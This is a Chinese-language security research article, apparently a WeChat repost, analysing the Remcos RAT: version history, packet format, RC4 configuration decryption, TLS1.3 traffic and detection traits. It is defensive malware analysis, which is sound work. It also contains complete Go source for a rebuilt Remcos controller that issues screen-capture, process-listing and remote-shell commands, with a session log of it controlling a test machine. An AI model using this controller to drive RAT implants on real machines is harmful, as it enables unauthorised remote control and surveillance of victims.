#  Remcos RAT通信模型剖析及攻防技术对抗

原创 T0daySeeker  [ T0daySeeker ](javascript:void\(0\);)

**T0daySeeker** ![]()

微信号 gh_26c54b2c64aa

功能介绍 专注APT样本的木马分析、流量分析、通信模型分析、攻击场景复现等。

____

___发表于_

    
    
    文章首发地址：https://xz.aliyun.com/t/13206  
    文章首发作者：T0daySeeker  
    

## 概述

最近，在浏览网络中威胁情报信息的时候，无意间发现多个APT组织均会使用Remcos商业木马作为远控程序窃取数据，于是，笔者就尝试了解和使用了Remcos商业木马，在模拟使用过程中，发现此商业木马使用起来确实还不错，而且目前还在维护更新，难怪会被众多APT组织青睐。

本着“既然Remcos商业木马被众多APT组织青睐，想必网络中肯定还有更多的Remcos商业木马的使用案例，因此，围绕Remcos商业木马的攻防技术研究肯定是有意义的”的思想，笔者从如下几个角度对Remcos商业木马进行了剖析：

  * 对Remcos商业木马的历史版本的升级迭代进行梳理，发现每一次大的版本升级，均会伴随着木马通信模型的升级优化；
  * 对Remcos商业木马最新版的通信模型进行了梳理剖析；
  * 从防御者角度对Remcos商业木马的配置文件提取、通信数据包解密等核心技术点进行了剖析，同时还对Remcos商业木马的加密通信识别提出了思考；
  * 为更好的辅助对Remcos商业木马的指令通信模型的剖析，模拟构建了Remcos商业木马的控制端程序，可对Remcos商业木马的通信模型进行复现，同时还能对单一指令编号的具体响应行为进行复现；

相关Remcos商业木马使用情况如下：

![]()

  

![]()

  

![]()

  

![]()

  

## Remcos历史版本通信模型

为了更好的理解Remcos远控的历史通信模型，笔者查阅了大量资料，从如下几个角度进行了尝试：

  * 查找网络中可用的历史版本程序：基本没找到历史可用版本，github上公开的部分程序均无法运行，感觉像是钓鱼木马（未实际验证）。
  * 查阅网络中针对Remcos木马的分析报告：网络通信模型的分析较少，只能靠只言片语进行拼凑。
  * 查阅Remcos官网对Remcos远控版本的说明：有详细的说明，但没有实际配置图片。

结合各类资料，笔者对Remcos远控的通信模型进行了梳理，梳理情况如下：

时间| 版本| 说明  
---|---|---  
v1.x| 2016 年 7 月 21 日--2018 年 2 月 2 日| socket套接字通信，使用带有静态密钥的RC4算法加密通信连接  
v2.x| 2018 年 2 月 2 日--2021 年 1 月 30 日| 重写连接协议，提高效率和速度  
v3.x| 2021 年 1 月 30 日--2023 年 11 月 26 日| 新增TLS1.3协议选项，用于通信连接  
v4.x| 2022 年 11 月 16 日--2023 年 11 月 26 日| Remcos v4.0提高了处理大量连接时的性能  
v4.9.3| 2023 年 11 月 26 日| 当前最新版本  
  
相关截图如下：

  * v1.0版本更新说明

![]()

  

  * v1.7版本Agent端网络连接配置（网络中图片）

![]()

  

  * v2.0.0版本更新说明

![]()

  

  * RC4算法加密通信连接（网络中报告截图）

    * 未使用加密算法下的纯文本通信模式下的通信数据包截图

![]()

    * 使用加密算法下的加密通信模式下的通信数据包截图

![]()

  * v3.0.0版本更新说明

![]()

  

![]()

  

  * v4.0.0版本Agent网络连接配置（官网图片）

![]()

  

  * v4.9.3版本Agent网络连接配置（官网免费版实际运行截图）

![]()

  

## Remcos-v4.9.3通信模型梳理

尝试从官网下载Remcos最新免费版远控程序，深入研究其通信模型，梳理发现，此版本支持两种通信模型：

  * TLS1.3通信协议：数据使用TLS协议加密传输；
  * socket套接字连接：数据使用TCP协议明文传输；

### TLS1.3通信协议模型

在Remcos最新免费版远控程序中配置TLS1.3通信协议模型时，需要手动填写一个密码（
**备注：通过查看TLS1.3通信协议原理，发现TLS1.3是不需要手动填写密码的，因此推测此密钥主要用于TLS1.3通信链接建立完成后的数据校验** ）。

相关截图如下：

![]()

  

![]()

  

### socket套接字通信模型

在Remcos最新免费版远控程序中配置socket套接字通信协议模型时，只需取消“Secure Connection(TLS1.3)”选项即可。

相关截图如下：

![]()

  

通过对通信数据包格式进行剖析，梳理通信数据格式如下：

    
    
    #数据包1  
    24 04 ff 00 #固定魔术值  
    0c 00 00 00 #后续有效数据大小  
    01 00 00 00 #有效数据-指令编号  
    30 7c 1e 1e 1f 7c 33 30 #有效数据-数据载荷  
      
    #数据包2  
    24 04 ff 00 #固定魔术值  
    64 00 00 00 #后续有效数据大小  
    4c 00 00 00 #有效数据-指令编号  
    #有效数据-数据载荷  
    30   
    7c 1e 1e 1f 7c #分隔符“|...|”  
    43 00 3a 00 5c 00 55 00 73 00 65 00 72 00 73 00 5c 00 61 00 64 00 6d 00 69 00 6e 00 5c 00 44 00 65 00 73 00 6b 00 74 00 6f 00 70 00 5c 00 72 00 65 00 6d 00 63 00 6f 00 73 00 5f 00 62 00 2e 00 65 00 78 00 65 00   
    7c 1e 1e 1f 7c #分隔符“|...|”  
    36 33   
    7c 1e 1e 1f 7c #分隔符“|...|”  
    39 38 36 37 30 35 32 33  
    

相关截图如下：

![]()

  

## 攻防技术对抗

为了能够更好的对Remcos远控程序进行攻防对抗及预警发现，笔者准备从取证分析角度对此远控程序Agent端木马进行剖析：

  * 木马配置信息提取：由于此样本是一款商业远控，因此其背景、功能等信息均可在网络中查询，无需分析样本即可有效获取相关信息，唯一需要分析提取的就是木马外链地址信息。
  * 木马通信解密尝试：通过对木马通信进行解密，可有效提取攻击者在攻击过程中执行的所有操作；由于此样本使用的是TLS1.3通信协议，笔者以前也未对基于TLS1.3通信协议的木马进行过解密尝试，因此暂时还没有好的思路从临检取证角度对其进行通信解密，因此笔者只能在此处对TLS1.3进行简单的对比介绍。
  * 木马加密通信识别：由于暂时无法对此样本的通信数据进行解密，因此只能从加密数据角度对此样本通信行为进行检测识别，因此，笔者从加密流量预警识别角度提出了检测识别思路（仅供参考）。

### RAT实操

通过对Remcos远控程序进行使用分析，发现此Remcos远控程序的整体操作确实很人性化、很流畅，经过官方7年的升级迭代，支持的指令也很丰富；由于使用的是免费版，Agent端运行后会弹出一个小框，因此此版本更多的是用于演示效果。

Agent端运行截图：

![]()

  

控制端运行截图如下：

![]()

  

### 配置信息解密

通过分析，发现Agent端样本运行后，将从“SETTINGS”资源段中读取并解密配置信息，配置信息中包括了：外链IP、外链端口以及其他的配置项等。

配置信息解密流程如下：

  * 从“SETTINGS”资源段中读取第一个字节，此字节即为下一段RC4密钥的大小；
  * 根据RC4密钥的大小，读取RC4密钥载荷；
  * 读取后续载荷用作实际加密配置信息数据；
  * 使用RC4密钥解密实际加密配置信息数据；

**备注：在分析过程中，笔者查阅了网络中的分析报告，发现不同报告中的不同Remcos版本均采用了相同的配置信息加密方式，因此，笔者推测Remcos历史版本至最新版本均采用统一的配置信息加密方式。**

Remcos-v4.9.3远控程序Agent端木马代码截图如下：

![]()

  

![]()

  

加密配置信息数据：

![]()

  

解密配置信息数据：

![]()

  

#### 解密脚本&工具

为实现快速解密，可基于CyberChef工具或编写解密脚本对“SETTINGS”资源段进行解密：

  * CyberChef工具：需要手动提取RC4密钥及载荷，然后进行解密；

![]()

  

  * 编写解密脚本：可实现自动化解密；

    
    
    package main  
      
    import (  
     "crypto/rc4"  
     "fmt"  
     "io/ioutil"  
    )  
      
    func main() {  
     file_in := "C:\\Users\\admin\\Desktop\\remcos_a_SETTINGS"  
     fileData, err := ioutil.ReadFile(file_in)  
     if err != nil {  
      fmt.Println("Error reading file:", err)  
      return  
     }  
      
     key_len := fileData[0]  
     key := fileData[1 : key_len+1]  
     cipherText := fileData[key_len+1:]  
      
     // 创建解密器  
     decipher, err := rc4.NewCipher(key)  
     if err != nil {  
      panic(err)  
     }  
      
     // 解密密文  
     decryptedText := make([]byte, len(cipherText))  
     decipher.XORKeyStream(decryptedText, cipherText)  
      
     ioutil.WriteFile(file_in+"decrypt", decryptedText, 0664)  
    }  
    

### 通信解密尝试？

在分析木马加密通信数据的过程中，笔者发现了多个与常规TLS解密有一些差异的地方：

  * 此木马通信数据中，无证书数据；
  * 使用的密钥套件不带DH算法；

由于笔者从未对TLS1.3与TLS1.2的区别进行过对比，因此在通信解密阶段走了不少弯路均无功而返，使用了多种方式对其通信数据进行解密发现均无法解密成功。

相关截图如下：

![]()

  

![]()

  

#### TLS1.3与TLS1.2的区别

通过查询网络中的资料《SSL/TLS、对称加密和非对称加密和TLSv1.3》，发现TLS1.3不仅对通信数据进行了加密，还对握手阶段的数据进行了加密。

相关对比截图如下：

![]()

  

![]()

  

#### TLS1.3与TLS1.2的通信解密

尝试构建程序模拟TLS1.3与TLS1.2通信，研究TLS1.3与TLS1.2的通信解密方法如下：

  * TLS1.2通信数据中，若使用的密钥套件未带DH算法，则可使用私钥或CLIENT_RANDOM形式的Master-Secret进行解密；
  * TLS1.2通信数据中，若使用的密钥套件带DH算法，则只能使用CLIENT_RANDOM形式的Master-Secret进行解密；
  * TLS1.3通信数据中，虽然使用的密钥套件未带DH算法，但由于其密钥握手阶段使用了DH算法，因此无法使用私钥进行解密；
  * TLS1.3通信数据中，由于其握手阶段的数据也被加密，因此无法使用CLIENT_RANDOM形式的Master-Secret进行解密；
  * TLS1.3通信数据中，需要使用CLIENT_HANDSHAKE_TRAFFIC_SECRET、SERVER_HANDSHAKE_TRAFFIC_SECRET、CLIENT_TRAFFIC_SECRET_0、SERVER_TRAFFIC_SECRET_0形式的Master-Secret进行解密；

”TLS1.2-私钥解密“相关截图：

![]()

  

”TLS1.2-CLIENT_RANDOM形式的Master-Secret解密“相关截图：

![]()

  

”TLS1.3-CLIENT_HANDSHAKE_TRAFFIC_SECRET、SERVER_HANDSHAKE_TRAFFIC_SECRET、CLIENT_TRAFFIC_SECRET_0、SERVER_TRAFFIC_SECRET_0形式的Master-
Secret解密“相关截图：

![]()

  

### 加密通信识别？

由于暂时无法对此样本的通信数据进行解密，因此只能从加密数据角度对此样本通信行为进行检测识别，通过对socket套接字通信过程与TLS1.3通信过程进行对比，发现可从如下角度对加密通信进行识别：

  * 加密通信使用TLS1.3通信协议；
  * Agent端木马在通信过程中，只提供了一种密钥套件用于密钥套件选择：Cipher Suite: TLS_AES_128_GCM_SHA256 (0x1301)
  * 心跳数据包会在主会话中循环发起通信，且心跳间隔默认为30秒；
  * 由于心跳数据包为固定范围长度（备注：不确定是否是固定长度），因此加密后数据长度也为固定范围长度；

#### socket套接字通信过程

通过对此样本的通信行为进行分析，笔者发现在Remcos-v4.9.3版本程序socket套接字通信过程中：

  * Remcos-v4.9.3版本程序将启动一个主会话用于接收远控指令及心跳数据（默认心跳间隔30秒）；

![]()

  

  * 当接收到部分响应数据比较小的远控指令时，Remcos-v4.9.3版本程序将直接于主会话中返回响应数据；

![]()

  * 当接收到部分响应数据比较大的远控指令时，Remcos-v4.9.3版本程序将启动一个子会话用于传输指令数据；

![]()

  

![]()

  

#### TLS1.3通信过程

通过对此样本的通信行为进行分析，笔者发现在Remcos-v4.9.3版本程序TLS1.3通信过程中：

  * Remcos-v4.9.3版本程序在建立TLS通信过程中，Agent端木马只提供了一种密钥套件用于密钥套件选择；

![]()

  

  * Remcos-v4.9.3版本程序将启动一个主会话用于接收远控指令及心跳数据（默认心跳间隔30秒）；

![]()

  

## 逆向开发Remcos RAT控制端

为了更好的对Remcos-v4.9.3版本远控程序的通信模型进行剖析，常规逻辑是对Agent端程序进行逆向分析、动态调试，但笔者考虑此Agent端程序的功能复杂，若采用此种方式，势必会花费大量的时间，为了能够快速梳理出各功能的响应指令（1.控制端界面指令；2.Agent端指令编号）及返回数据，笔者从如下角度对此问题进行了考虑：

  * 思考1：通常一个远控程序在执行某个功能（控制端界面指令）时，Agent端接收到的指令往往并非是一个指令编号（例如：使用文件管理功能时，往往会把查看磁盘目录指令、获取指定磁盘目录指令同时发送至Agent端），如何区分不同指令编号的功能，则需要多次尝试或详细对比分析；
  * 思考2：若远控程序的所有通信在一个会话中，则我们可根据数据包响应顺序及响应数据包内容快速研判对应功能的响应指令；
  * 思考3：若远控程序的所有通信在不同会话中，且执行一个指令（控制端界面指令）时，会连续开启多个会话通信，则我们需要结合逆向分析才能确定对应功能的响应指令；
  * 思路尝试：假如我们能够逆向开发远控程序的控制端，在控制端中模拟复现远控程序的通信模型，则我们即可以根据指令编号向Agent端木马发送指令，捕获指令响应数据，便于基于数据包形态快速的对木马指令的通信模型进行详细剖析，基于木马形态对指定指令编号进行逆向调试。

因此，基于上述思路，笔者尝试模拟构建了Remcos-v4.9.3远控程序的控制端，并可实现对部分指令的模拟复现。

### 场景模拟

  * 使用Remcos-v4.9.3远控程序构建Agent并运行

![]()

  

  * 使用模拟构建的控制端程序模拟Remcos-v4.9.3远控程序上线并执行远控指令

![]()

  

screen_capture指令响应后返回的截图：

![]()

  

场景模拟实操：

    
    
    F:\GolandProjects\Client_Remcos>Client_Remcos.exe  
    Server started. Listening on 0.0.0.0:8080  
    初始化连接......  
    请输入指令：  
    help  
            screen_capture:截屏  
            process_manager：进程管理  
            command_line：执行命令行  
            close：关闭Agent进程  
            uninstall：卸载Agent  
            exit：退出Client  
    请输入指令：  
    process_manager  
    current process PID：1580  
    Process Name    Path    PID  
    System          4  
    smss.exe                316  
    csrss.exe               404  
    wininit.exe             444  
    services.exe            544  
    lsass.exe               564  
    lsm.exe         572  
    svchost.exe             680  
    svchost.exe             744  
    svchost.exe             816  
    svchost.exe             892  
    svchost.exe             956  
    svchost.exe             1092  
    HaozipSvc.exe           1220  
    svchost.exe             1356  
    spoolsv.exe             1540  
    svchost.exe             1620  
    VGAuthService.exe               1984  
    vm3dservice.exe         1588  
    vmtoolsd.exe            940  
    WmiPrvSE.exe            2536  
    SearchIndexer.exe               2940  
    svchost.exe             2992  
    svchost.exe             3340  
    svchost.exe             652  
    msdtc.exe               1328  
    csrss.exe               2892  
    winlogon.exe            3504  
    vm3dservice.exe         3980  
    taskhost.exe    C:\Windows\System32\taskhost.exe        3136  
    dwm.exe C:\Windows\System32\dwm.exe     2292  
    explorer.exe    C:\Windows\explorer.exe 1640  
    vmtoolsd.exe    C:\Program Files\VMware\VMware Tools\vmtoolsd.exe       3120  
    svchost.exe             1460  
    ProcessHacker.exe       C:\Program Files\Process Hacker 2\ProcessHacker.exe     1120  
    remcos_c.exe    C:\Users\admin\Desktop\remcos_c.exe     1580  
    conhost.exe     C:\Windows\System32\conhost.exe 5504  
      
    请输入指令：  
    command_line  
    Microsoft Windows [Version 6.1.7601]  
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.  
      
    C:\>dir  
     Volume in drive C has no label.  
     Volume Serial Number is A4EF-9C64  
      
     Directory of C:\  
      
    2009/06/11  05:42                24 autoexec.bat  
    2009/06/11  05:42                10 config.sys  
    2009/07/14  10:37    <DIR>          PerfLogs  
    2023/12/10  21:49    <DIR>          Program Files  
    2023/03/25  12:46    <DIR>          Users  
    2023/12/10  21:49    <DIR>          Windows  
                   2 File(s)             34 bytes  
                   4 Dir(s)  55,032,639,488 bytes free  
      
    C:\>ipconfig  
      
    Windows IP Configuration  
      
      
    Ethernet adapter Bluetooth ��������:  
      
       Media State . . . . . . . . . . . : Media disconnected  
       Connection-specific DNS Suffix  . :  
      
    Ethernet adapter ��������:  
      
       Connection-specific DNS Suffix  . : localdomain  
       Link-local IPv6 Address . . . . . : fe80::50a0:a823:67:d3ca%11  
       IPv4 Address. . . . . . . . . . . : 192.168.126.140  
       Subnet Mask . . . . . . . . . . . : 255.255.255.0  
       Default Gateway . . . . . . . . . :  
      
    Tunnel adapter isatap.{53110CDC-B297-4DEF-B498-D66141DF7DB6}:  
      
       Media State . . . . . . . . . . . : Media disconnected  
       Connection-specific DNS Suffix  . :  
      
    Tunnel adapter isatap.localdomain:  
      
       Media State . . . . . . . . . . . : Media disconnected  
       Connection-specific DNS Suffix  . : localdomain  
      
    C:\>whoami  
    win-5nxxxxxxx7b\admin  
      
    C:\>exit  
    请输入指令：  
    help  
            screen_capture:截屏  
            process_manager：进程管理  
            command_line：执行命令行  
            close：关闭Agent进程  
            uninstall：卸载Agent  
            exit：退出Client  
    请输入指令：  
    screen_capture  
    请输入指令：  
    screen_capture output:截屏保存于01.png文件中  
      
    请输入指令：  
    exit  
      
    F:\GolandProjects\Client_Remcos>  
    

### 代码实现

代码结构如下：

![]()

  

  * main.go

    
    
    package main  
      
    import (  
     "Client_Remcos/remcos_xx"  
     "bufio"  
     "encoding/hex"  
     "fmt"  
     "net"  
     "os"  
    )  
      
    func main() {  
     client_Remcos("0.0.0.0", "8080")  
    }  
      
    func client_Remcos(address, port string) {  
     // 创建监听器  
     listener, err := net.Listen("tcp", address+":"+port)  
     if err != nil {  
      fmt.Println("Error listening:", err.Error())  
      return  
     }  
     defer listener.Close()  
      
     fmt.Println("Server started. Listening on " + address + ":" + port)  
      
     for {  
      conn, err := listener.Accept()  
      if err != nil {  
       fmt.Println("Error accepting connection:", err.Error())  
       return  
      }  
      // 处理服务端连接  
      go handle_Remcos_Connection(conn)  
     }  
    }  
      
    func handle_Remcos_Connection(conn net.Conn) {  
     defer conn.Close()  
      
     recvdata, err := remcos_xx.RecvBuf(conn)  
     if err != nil {  
      fmt.Println(err.Error())  
      panic(0)  
     }  
     command := remcos_xx.ParseCommand(recvdata[:4])  
      
     switch hex.EncodeToString(command) {  
     case "0000004b":  
      fmt.Println("初始化连接......")  
      remcos_xx.Initconnect(conn)  
      go remcos_xx.Heartbeat(conn)  
     case "00000010":  
      remcos_xx.Command_Screen_Capture(conn)  
      return  
     case "00000093":  
      remcos_xx.Command_Command_Line(conn)  
      return  
     }  
      
     for {  
      fmt.Println("请输入指令：")  
      reader := bufio.NewScanner(os.Stdin)  
      if reader.Scan() {  
       text := reader.Text()  
       switch text {  
       case "screen_capture":  
        sendbuf, _ := hex.DecodeString("100000003133363339313535327c1e1e1f7c35307c1e1e1f7c307c1e1e1f7c2d317c1e1e1f7c30")  
        remcos_xx.Sendbuf(conn, sendbuf)  
       case "process_manager":  
        sendbuf, _ := hex.DecodeString("06000000")  
        remcos_xx.Sendbuf(conn, sendbuf)  
      
        recvdata, err = remcos_xx.RecvBuf(conn)  
        if err != nil {  
         fmt.Println(err.Error())  
         panic(0)  
        }  
        command = remcos_xx.ParseCommand(recvdata[:4])  
        if hex.EncodeToString(command) == "0000004f" {  
         remcos_xx.Command_Process_Manager(recvdata[4:])  
        }  
       case "command_line":  
        sendbuf, _ := hex.DecodeString("0e0000003133353730373732387c1e1e1f7c636d642e657865")  
        remcos_xx.Sendbuf(conn, sendbuf)  
        for {  
         reader = bufio.NewScanner(os.Stdin)  
         if reader.Scan() {  
          text = reader.Text()  
          if text == "exit" {  
           remcos_xx.Stop()  
           break  
          } else {  
           sendbuf = []byte{0x0E, 0x00, 0x00, 0x00, 0x31, 0x33, 0x35, 0x37, 0x30, 0x37, 0x37, 0x32, 0x38, 0x7C, 0x1E, 0x1E, 0x1F, 0x7C}  
           sendbuf = append(sendbuf, []byte(text)...)  
           sendbuf = append(sendbuf, []byte{0x7C, 0x1E, 0x1E, 0x1F, 0x7C}...)  
           remcos_xx.Sendbuf(conn, sendbuf)  
          }  
         }  
        }  
       case "close":  
        sendbuf, _ := hex.DecodeString("21000000")  
        remcos_xx.Sendbuf(conn, sendbuf)  
        os.Exit(0)  
       case "uninstall":  
        sendbuf, _ := hex.DecodeString("22000000")  
        remcos_xx.Sendbuf(conn, sendbuf)  
        os.Exit(0)  
       case "exit":  
        os.Exit(0)  
       case "help":  
        fmt.Println("\tscreen_capture:截屏")  
        fmt.Println("\tprocess_manager：进程管理")  
        fmt.Println("\tcommand_line：执行命令行")  
        fmt.Println("\tclose：关闭Agent进程")  
        fmt.Println("\tuninstall：卸载Agent")  
        fmt.Println("\texit：退出Client")  
       }  
      }  
     }  
    }  
    

  * common/common.go

    
    
    package common  
      
    import (  
     "bytes"  
     "encoding/binary"  
     "fmt"  
     "io"  
     "os"  
    )  
      
    func Reversedata(arr *[]byte) {  
     var temp byte  
     length := len(*arr)  
     for i := 0; i < length/2; i++ {  
      temp = (*arr)[i]  
      (*arr)[i] = (*arr)[length-1-i]  
      (*arr)[length-1-i] = temp  
     }  
    }  
      
    func BytesToInt(bys []byte) int {  
     bytebuff := bytes.NewBuffer(bys)  
     var data int32  
     binary.Read(bytebuff, binary.BigEndian, &data)  
     return int(data)  
    }  
      
    func IntToBytes(n int) []byte {  
     data := int32(n)  
     bytebuf := bytes.NewBuffer([]byte{})  
     binary.Write(bytebuf, binary.BigEndian, data)  
     return bytebuf.Bytes()  
    }  
      
    func checkPathIsExist(filename string) bool {  
     var exist = true  
     if _, err := os.Stat(filename); os.IsNotExist(err) {  
      exist = false  
     }  
     return exist  
    }  
      
    func Writefile(filename string, buffer string) {  
     var f *os.File  
     var err1 error  
      
     if checkPathIsExist(filename) { //如果文件存在  
      f, err1 = os.OpenFile(filename, os.O_CREATE, 0666) //打开文件  
      //fmt.Println(filename, "文件存在,更新文件")  
     } else {  
      f, err1 = os.Create(filename) //创建文件  
      //logger.Logger.Info("文件不存在")  
     }  
     //将文件写进去  
     _, err1 = io.WriteString(f, buffer)  
     if err1 != nil {  
      fmt.Println("写文件失败", err1)  
      return  
     }  
     _ = f.Close()  
    }  
    

  * remcos_xx/remcos_xx.go

    
    
    package remcos_xx  
      
    import (  
     "Client_Remcos/common"  
     "encoding/hex"  
     "fmt"  
     "net"  
     "sync"  
    )  
      
    var (  
     mu      sync.Mutex  
     stopped bool  
    )  
      
    func Stop() {  
     mu.Lock()  
     stopped = true  
     mu.Unlock()  
    }  
      
    func RecvBuf(conn net.Conn) (buf_recv []byte, err error) {  
     for {  
      buffer := make([]byte, 4096)  
      bytesRead, err := conn.Read(buffer)  
      if err != nil {  
       fmt.Println("Error reading:", err.Error())  
      }  
      buf_recv = append(buf_recv, buffer[:bytesRead]...)  
      
      if hex.EncodeToString(buf_recv[:4]) == "2404ff00" {  
       hex_len := []byte{}  
       hex_len = append(hex_len, buf_recv[4:8]...)  
       common.Reversedata(&hex_len)  
       buflen := common.BytesToInt(hex_len)  
      
       if len(buf_recv)-8 >= buflen {  
        return buf_recv[8:], err  
       }  
      }  
     }  
     return  
    }  
      
    func ParseCommand(buf []byte) []byte {  
     command := []byte{}  
     command = append(command, buf...)  
     common.Reversedata(&command)  
     return command  
    }  
      
    func Sendbuf(conn net.Conn, buf []byte) {  
     sendbuf := []byte{0x24, 0x04, 0xff, 0x00}  
     buflen := len(buf)  
     hex_len := common.IntToBytes(buflen)  
     common.Reversedata(&hex_len)  
     sendbuf = append(sendbuf, hex_len...)  
     sendbuf = append(sendbuf, buf...)  
     conn.Write(sendbuf)  
    }  
    

  * remcos_xx/initconnect.go

    
    
    package remcos_xx  
      
    import (  
     "encoding/hex"  
     "fmt"  
     "net"  
    )  
      
    func Initconnect(conn net.Conn) {  
     sendbuf, _ := hex.DecodeString("01000000307c1e1e1f7c3330")  
     Sendbuf(conn, sendbuf)  
      
     _, err := RecvBuf(conn)  
     if err != nil {  
      fmt.Println(err.Error())  
      panic(0)  
     }  
      
     sendbuf, _ = hex.DecodeString("11000000")  
     Sendbuf(conn, sendbuf)  
      
     _, err = RecvBuf(conn)  
     if err != nil {  
      fmt.Println(err.Error())  
      panic(0)  
     }  
    }  
    

  * remcos_xx/heartbeat.go

    
    
    package remcos_xx  
      
    import (  
     "encoding/hex"  
     "fmt"  
     "net"  
     "time"  
    )  
      
    func Heartbeat(conn net.Conn) {  
     for {  
      sendbuf, _ := hex.DecodeString("01000000307c1e1e1f7c3330")  
      Sendbuf(conn, sendbuf)  
      
      recvdata, err := RecvBuf(conn)  
      if err != nil {  
       fmt.Println(err.Error())  
       panic(0)  
      }  
      ParseCommand(recvdata[:4])  
      time.Sleep(30 * time.Second)  
     }  
    }  
    

  * remcos_xx/command_Screen_Capture.go

    
    
    package remcos_xx  
      
    import (  
     "Client_Remcos/common"  
     "encoding/hex"  
     "fmt"  
     "net"  
     "strings"  
    )  
      
    func Command_Screen_Capture(conn net.Conn) {  
     recvdata, err := RecvBuf(conn)  
     if err != nil {  
      fmt.Println(err.Error())  
      panic(0)  
     }  
     //fmt.Println(hex.EncodeToString(recvdata))  
      
     hex_datas := strings.Split(hex.EncodeToString(recvdata[4:]), "7c1e1e1f7c")  
     filename, _ := hex.DecodeString(hex_datas[0])  
     bufdata, _ := hex.DecodeString(hex_datas[1])  
      
     fmt.Println("screen_capture output:" + "截屏保存于" + string(filename) + ".png" + "文件中")  
     common.Writefile(string(filename)+".png", string(bufdata))  
    }  
    

  * remcos_xx/command_Process_Manager.go

    
    
    package remcos_xx  
      
    import (  
     "bytes"  
     "fmt"  
    )  
      
    func Command_Process_Manager(buf_recv []byte) {  
     datas := bytes.Split(buf_recv, []byte{0x7c, 0x1e, 0x1e, 0x1f, 0x7c})  
      
     list_process := datas[0]  
     pid_current := datas[1]  
      
     fmt.Println("current process PID：" + string(pid_current))  
      
     fmt.Println("Process Name\tPath\tPID")  
     list_process = bytes.ReplaceAll(list_process, []byte{0x00}, []byte{})  
     list_process = bytes.ReplaceAll(list_process, []byte{0xa6, 0x30, 0x7c}, []byte("\n"))  
     list_process = bytes.ReplaceAll(list_process, []byte{0xa6}, []byte("\t"))  
     fmt.Println(string(list_process))  
      
    }  
    

  * remcos_xx/command_Command_Line.go

    
    
    package remcos_xx  
      
    import (  
     "encoding/hex"  
     "fmt"  
     "net"  
    )  
      
    func Command_Command_Line(conn net.Conn) {  
     for {  
      mu.Lock()  
      if stopped {  
       mu.Unlock()  
       break // 退出循环  
      }  
      mu.Unlock()  
      
      buf_recv, err := RecvBuf(conn)  
      if err != nil {  
       fmt.Println(err.Error())  
       panic(0)  
      }  
      if (hex.EncodeToString(buf_recv[:4]) == "62000000") && (len(buf_recv) > 4) {  
       fmt.Print(string(buf_recv[4:]))  
      }  
     }  
    }

  

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# Remcos RAT通信模型剖析及攻防技术对抗

原创 T0daySeeker  [ T0daySeeker ](javascript:void\(0\);)

轻触阅读原文

![]()

T0daySeeker

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

